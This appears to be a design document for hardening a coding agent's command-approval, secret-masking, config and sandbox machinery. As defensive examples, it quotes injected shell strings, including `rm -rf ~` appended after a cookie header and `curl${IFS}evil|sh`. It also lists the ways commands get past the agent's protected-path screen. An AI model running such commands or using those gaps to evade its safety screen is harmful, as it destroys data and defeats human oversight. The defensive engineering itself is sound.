# Cross-phase review P0-P5: remaining findings — design

**Date:** 2026-09-24
**Branch:** `feat/xreview-remaining` (off `main` @ `3b7834208`)
**Source:** cross-phase review P0-P5 (findings #8, #9, #10, #14, #17, #19, #20, #21, #22 and the
composite test gaps). Findings #1-#7, #12, #13, #15, #16, #18 are merged (#2203-#2207, #2219, #2222).
**Out of scope:** #11 (approvals CLI — needs its own design); simplifying #2199's all-package raw scan.

All findings were re-verified on `3b7834208` before this design; line numbers below are from that commit.

## Rulings

| # | Ruling |
|---|---|
| #8 | Honest wording only. The raw screen stays advisory (ADR-030 "must never be grown into a general gate"). |
| #9 | Mask-or-deny for every approval channel; redact local audit rows; amend D18. |
| #10 | The agent-command safety keys become root-only, warn-and-ignore in a package config. Recorded as ADR-031. |
| #14 | Closed as a non-issue: one process, one `O_APPEND` write per row, regular file. No code. |
| #17 | Pre-check the literal-path rule at session start; failure = sandbox `unavailable`. |
| #19 | Reference+length snapshot in production (detect, log, restore); opt-in deep-freeze for tests. |
| #20 | Fire `before_turn_end` on the error path with a new `ended` field. |
| #21 | Dedupe key gains the tool name; command-less asks are never deduped. |
| #22 | Document the keys; ratchet description coverage for these execution subtrees. |

## 1. Secrets in commands (#9)

### Problem

A command carrying a credential (`curl -H 'Authorization: Bearer sk-...'`) is sent verbatim off-host
when it needs approval — Telegram (`telegram.ts:194`) and the webhook plugin
(`plugins/webhook.ts:255-276`, which POSTs the whole request) both receive the prompt `detail` built
at `ask-link.ts:309-319`. The same string is written unredacted to approval-audit
(`approval-audit.ts:29`), command-safety rows (`row.ts:12`), and tool-audit (`tool-audit.ts:171-183`,
including `sandbox.argv` added by #2219). `src/logger/redact.ts` has value patterns
(`SECRET_VALUE_PATTERNS`, `:32-97`) but nothing on these paths calls them.

Masking naively is unsafe: several patterns consume shell syntax. `Cookie\s*:\s*[^\r\n]+` masks to
end of line (`curl -H 'Cookie: a=b'; rm -rf ~` would show as `curl -H '[REDACTED]`), the
`TOKEN=[^\s"',]+` pattern swallows `TOKEN=$(curl${IFS}evil|sh)`, and the PEM pattern spans up to
64 KB between markers. A masked prompt must never hide code from the approver.

### Design

**New module `src/permissions/secret-spans.ts`:**

- `findSecretSpans(text: string): readonly SecretSpan[]` — `{ start, end, kind }`, non-overlapping,
  built from the patterns in `redact.ts`. `redact.ts` exports the pattern table (with a `kind` label
  per entry) and `redactString`; its own behaviour is unchanged.
- `maskForPrompt(text: string): MaskResult` where
  `MaskResult = { ok: true; masked: string; count: number } | { ok: false; reason: string }`.
  A span is **inert** when it contains none of: `$` `` ` `` `;` `|` `&` `<` `>` `(` `)` `'` `"`
  or a newline. Any non-inert span -> `ok: false`. Otherwise each span is replaced by
  `[REDACTED:<kind>]`.

**Ask link (`ask-link.ts` `resolve`, beside the `MAX_COMMAND_CHARS` check at `:431-433`):**

- Run `maskForPrompt` on `req.command` and on `req.summary`.
- Either `ok: false` -> settle immediately `deny` with a new `decidedBy: "unshowable"` and a reason
  naming the cause ("command contains a secret whose masked form could hide shell syntax"). No channel
  is prompted. `"unshowable"` is added to the `decidedBy` union and flows to approval-audit and
  the P5 corpus unchanged.
- `ok: true` with `count > 0` -> the prompt `detail` and `summary` use the masked text, and `detail`
  gains the line `N secret value(s) masked; the approved command contains them`.
- The dedupe key, approvals-cache key, shadow input and the executed command keep the original bytes.
  Masking happens only where the prompt text is assembled.

**Local rows are redacted at write time with `redactSecrets`:** `appendApprovalAudit`,
`appendCommandSafetyRow`, and the tool-audit flush (`input`, `executed`, `sandbox.argv`).
`approvals.json` (the cache store) is **not** redacted — it must match byte-exact (D17).

**Docs:** ADR-030 (in repo) and D18 in the workspace master plan
(`subrina-coder/projects/nax/nax-native-coding-agent-master-plan.md`, outside this repo) are amended to
"the approval prompt shows the command verbatim except inert secret spans, or the gate denies".

### Tests

- `secret-spans` unit: inert Bearer / `sk-` / `ghp_` masked with kind; `Cookie: a=b'; rm -rf ~`,
  `TOKEN=$(...)`, a PEM block (newlines) -> `ok: false`; no-secret text -> `count: 0`, unchanged.
- `ask-link` unit: masked `detail`/`summary` reach `chain.prompt` with the footer line;
  `unshowable` never calls `chain.prompt`; dedupe key still uses the raw command.
- Row writers: the secret value is absent from approval-audit, command-safety and tool-audit JSONL;
  `approvals.json` still holds the raw command.

## 2. Root-scoped agent-command safety config (#10) — ADR-031

### Problem

`mergePackageConfig` (`merge.ts:96-98`) spreads `...packageOverride.execution`, so a package config
can override `execution.bashApproval`, `approvalTimeout`, `sandbox`, `commandSafety` and
`permissions.<stage>.bashApproval` — undocumented, and not in the merge docblock. Run-scope ops
ignore those overrides anyway: `finish/phase.ts:287-292` and `run-regression.ts:452-453` pass root as
both `config` and `rootConfig`, and `acceptance-fix-scope.ts:43-44` reads `packageView.config`, the
path known to miss under worktree/parallel isolation (#2069). A feature can span packages, so no
single package's value is correct for a whole-feature op.

### Design

- **Root-only keys:** `execution.bashApproval`, `execution.approvalTimeout`, `execution.sandbox`,
  `execution.commandSafety`, and `bashApproval` inside every `execution.permissions.<stage>` block.
  Per-package `permissions.<stage>.allow/deny/allowedTools` keep merging as today.
- **Enforcement:** `mergePackageConfig` takes those keys from root regardless of the override.
  One shared list (`ROOT_ONLY_EXECUTION_KEYS`) drives both the strip and the warning.
- **Warning:** when a package override sets any of them, log once per file and key:
  `.nax/mono/<pkg>/config.json: execution.<key> is root-only (ADR-031); ignored`. Emitted where the
  file path is known (`loadPackageOverride`, `loader.ts:394`).
  **Constraint:** `loader.ts` is at the 600-line gate — net line growth there must be zero.
- **Package profiles:** `loadConfigForWorkdir` applies a package's `profile` after the merge. The plan
  must verify whether that path bypasses `mergePackageConfig`; if it does, root-only is enforced after
  the profile step too.
- **acceptance-fix-scope:** `buildRunDispatchAskWiring` reads only root-only keys, so it passes
  `ctx.config`; the `packageView.config` read is removed.
- **finish / run-regression:** unchanged behaviour; a one-line comment at each root/root call noting
  it is correct by construction under ADR-031.
- **ADR-031 "Agent-command safety config is root-scoped"** (`docs/adr/ADR-031-*.md`): context (the
  spread leak, whole-feature ops, `interaction` already root-only), decision, rejected alternatives
  (strictest-merge across packages; per-group dispatch; hard validation error — nax exits 0 on
  validation errors), consequences (no per-package stricter mode — tighten root; every op sees one
  value), links to ADR-030 (add a "See also" line there), D18/D20, review #10.

### Tests

- A package override setting each root-only key: merged config carries root's value; one warning
  per key naming the file.
- A package override of `permissions.<stage>.allow`: still merged; its `bashApproval` sibling ignored.
- A package profile setting a root-only key: ignored (whichever enforcement point the plan settles).
- acceptance-fix scope: dispatch wiring receives root values when the package has an override.

## 3. Sandbox: glob characters in the repo path (#17)

`policy-builder.ts:44-54` `literal()` throws `SANDBOX_POLICY_NOT_LITERAL` for any path with
`SANDBOX_GLOB_CHARS` (`schemas-sandbox.ts:15`), and the repo root goes through it (`:88-89`). The probe
builds its policy under an `mkdtemp` path (`probe.ts:31`), so it passes, and the throw fires per
command at `launcher.ts:115`.

**Design:** `resolveSessionSandbox` (`coding-tool-sandbox.ts:41`) runs the same literal check on the
session's root and write roots before building the launcher, reusing the `policy-builder` rule (export
it; no copy). Failure -> the session sandbox is `unavailable` with a reason naming the path, and the
existing fail-closed rules apply (raw refused; gated/escalate unwrapped with the warning).

**Tests:** a repo root containing `[x]` -> `unavailable` at session start with the path in the reason;
no per-command throw.

## 4. Raw-screen wording (#8)

The screen matches exact protected file paths only (`policy-bash-raw.ts:101-119`,
`nax-owned-writes.ts`). **Design:** rewrite `bash.ts:159-163` so the description says: the screen
matches exact file paths; directory targets (`cp x .nax/`), globs, nested shells (`sh -c`),
`tar -C` / `dd of=`, and symlink aliases also skip it; it is advisory — use the sandbox for a
boundary. Add these as known gaps 4-6 in ADR-030's advisory section (`:137-151`). Update any test that
pins the description text.

## 5. Loop-event cache boundary: in-place mutation (#19)

`checkPrefixStable` (`cache-boundary.ts:3-37`) inspects only returned patches; for `transform_context`
the live array is passed (`turn-complete-step.ts:134`) and persisted by `saveTranscript`. Only built-in
handlers register today (`loop-handlers.ts:70-77`); this guards the P6 seam.

**Design:**

- Before each handler, `dispatch` snapshots every array-valued payload field: length plus element
  references (O(n) pointer copy, no content hashing).
- After the handler, if the snapshot differs, log
  `cache-boundary: handler mutated payload in place` (event, handler name) and restore the array
  to the snapshot in place (same array object, original element references), so neither the
  transcript nor the prompt-cache prefix changes. A returned patch is then evaluated as today.
- Field edits inside an element are not detected in production; the docblock says so.
- **Test aid:** the registry gains an injected option `freezePayloads?: boolean` (default `false`);
  when set, payloads are deep-frozen before each handler so any in-place edit throws. The loop-events
  test helpers enable it. No environment sniffing.

**Tests:** handler `push`/`splice` -> detected, logged, restored; returned patch unaffected; with
`freezePayloads`, a field edit throws.

## 6. `before_turn_end` on the error path (#20)

`turn-loop.ts:386` dispatches only inside the `try`; the `catch` (`:414-433`) saves, records usage and
rethrows, and #2222 added a throw at `:370-371`. No production subscriber exists.

**Design:**

- `BeforeTurnEndPayload` (`loop-events/types.ts:177`) gains
  `readonly ended: "completed" | "cancelled" | "errored"`; existing call sites pass `"completed"`.
- The catch path dispatches once, before its `saveTranscript`, with `ended: "cancelled"` when the turn
  signal is aborted and `"errored"` otherwise. The dispatch is awaited; any result (including
  `followUp`) is ignored, with the existing warn when `followUp` is set. Handler exceptions are already
  logged and skipped, so the original error is rethrown unchanged.
- The dispatch helper lives in its own module, `session/turn-end-event.ts`, so `turn-loop.ts`
  (464 lines) does not grow materially.

**Tests:** a throw fires the event once with `errored`; an abort fires it with `cancelled`; the
rethrown error is the same object; `followUp` on the error path is ignored.

## 7. Ask dedupe key (#21)

`ask-link.ts:434` keys on `stage\0command`; asks without a command (Write/Edit/path tools,
argv-only Exec — only Bash declares `commandField`, `bash.ts:225`) all share `stage\0`.

**Design:** key = `stage\0tool\0command`. When `command` is empty the ask is never deduped: it always
opens its own session.

**Tests:** two command-less asks -> two prompts; two identical Bash asks -> one prompt, both waiters
settle; the same command under different tools -> two prompts.

## 8. Docs (#22) and #14 close-out

- `src/cli/config-descriptions.ts`: entries for `execution.bashApproval`, `execution.approvalTimeout`,
  `execution.sandbox.*`, `execution.commandSafety.*`, `execution.permissions.<stage>.bashApproval`,
  each noting root-only (ADR-031).
- `docs/guides/configuration.md`: a section for these keys; `docs/guides/permissions.md` links to it
  and to ADR-031.
- **Ratchet:** a test asserting every schema key under those execution subtrees has a description.
  Whole-schema coverage is out of scope.
- #14: closed in the review status doc with the evidence (single process; `fs/promises.appendFile`
  opens `O_APPEND`; one write per row).

## 9. Composite test gaps (test code only)

| Gap | File | Backend |
|---|---|---|
| escalate + sandbox + shadow on one command: one byte-identical string at prompt, cache, shadow and wrapped argv | `test/integration/permissions/bash-deny-suite.test.ts` | fake |
| human-approved, then sandbox-denied write to a protected path; recorded | `test/integration/sandbox/sandbox-live.test.ts` | real (skips with reason when unavailable) |
| cache hit under sandbox still runs wrapped (`sandbox.argv` present) | `test/unit/tools/runtime-sandbox-audit.test.ts` | fake |
| loop events around a human ask: `before_tool` -> ask -> `after_tool`, nothing fires during the wait | `test/unit/agents/native/session/loop-events/turn-lifecycle.test.ts` | none |
| sandbox wrap throw through `runtime.callTool`: error result, audit row, no execution | `test/unit/tools/runtime-sandbox-argv.test.ts` | fake (`throw` mode) |

## Constraints

- File-size gate 600 (src) / 800 (test): `loader.ts` is at 600 (net zero); new logic goes in new
  modules (`secret-spans.ts`, turn-end dispatch helper, root-only key list).
- Verification uses repo commands: `bun run test`, `bun run typecheck`, `bun run check:all`
  (typecheck is not part of `check:all`). Never bare `bun test`.
- No billed runs; no nax run for this work — executed in-session from the writing-plans plan.

## Success criteria

- Every item above has its tests, written first and green.
- `bun run test`, `bun run typecheck`, `bun run check:all` green.
- ADR-031 present; ADR-030 and D18 amended; review status doc updated (#8 #9 #10 #14 #17 #19 #20 #21
  #22 closed by this branch, #11 still open).
